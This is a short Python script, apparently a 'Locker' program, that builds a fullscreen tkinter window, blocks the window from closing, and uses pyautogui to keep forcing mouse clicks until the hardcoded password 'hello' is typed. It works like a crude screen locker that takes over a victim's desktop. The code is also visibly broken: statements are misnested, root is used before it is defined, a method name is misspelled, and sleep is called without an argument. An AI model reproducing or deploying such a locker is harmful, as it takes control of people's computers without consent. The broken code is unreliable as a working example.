from tkinter import Tk,Entry,Label
from pyautogui import click, moveTo
from time import sleep
def callback(event):
    global k,entry
    if entry.get()=="hello": k=True
    def on_closing():
        click(675, 420)
        moveTo(675, 420)
        root.attributes("-fullscreen",True)
        root.protocol("WM_DELETE_WINDOW", on_closing)
        root.udpate()
        root.bind('<Control-KeyPress-c>', callback)
        root=Tk()
        root.title("Locker")
        root.attributes("-fullscreen",True)
        entry=Entry(root,font=1)
        entry.place(width=150,height=50,x=600,y=400)
        label0=Label(root,text="Locker_by_#571",font=1)
        label0.grid(row=0,column=0)
        label1=Label(root,text="Write the Password and Press Ctrl+C",font=1)
        label1.place(x=470,y=300)
        root.update(); sleep(); click(675, 420)
        k=False
        while k!=True: on_closing()
